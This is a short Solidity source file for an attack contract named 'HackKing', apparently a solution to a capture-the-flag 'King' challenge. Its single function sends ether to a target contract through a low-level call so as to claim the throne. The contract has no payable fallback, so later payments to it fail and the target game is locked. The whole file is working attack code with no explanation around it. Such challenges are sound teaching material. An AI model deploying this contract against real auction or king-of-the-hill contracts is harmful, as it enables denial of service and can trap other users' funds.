//SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.5.0;

contract HackKing {

  function createNewKing(address king) public payable {
    (bool result, bytes memory data) = king.call.value(msg.value)("");
    if(!result) revert();
  }

}
